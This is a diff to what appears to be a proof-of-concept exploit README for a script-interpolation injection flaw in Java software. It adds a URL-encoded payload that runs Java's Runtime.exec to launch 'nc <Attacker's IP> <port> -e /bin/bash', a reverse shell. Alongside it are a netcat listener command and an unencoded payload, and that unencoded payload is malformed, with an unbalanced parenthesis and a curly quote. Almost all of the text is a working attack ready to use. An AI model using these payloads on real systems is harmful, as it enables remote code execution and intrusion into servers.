@@ -31,9 +31,13 @@ You can use Docker to be able to run this PoC:
 ```
    sudo rlwrap nc -nlvp 443
 ```
-1. Payload
+2. Payload
 ```
    ${script:javascript:java.lang.Runtime.getRuntime().exec'<Command to Execute>’)}
+```
+3. Encoded payload
+```
+  %24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%20<Attacker's IP>%20<Attacker's port>%20-e%20%2Fbin%2Fbash%27%29%7D
 ```
 
 Recommended URL encoder for successful exploit demonstration: [https://www.urlencoder.org/](https://www.urlencoder.org/).
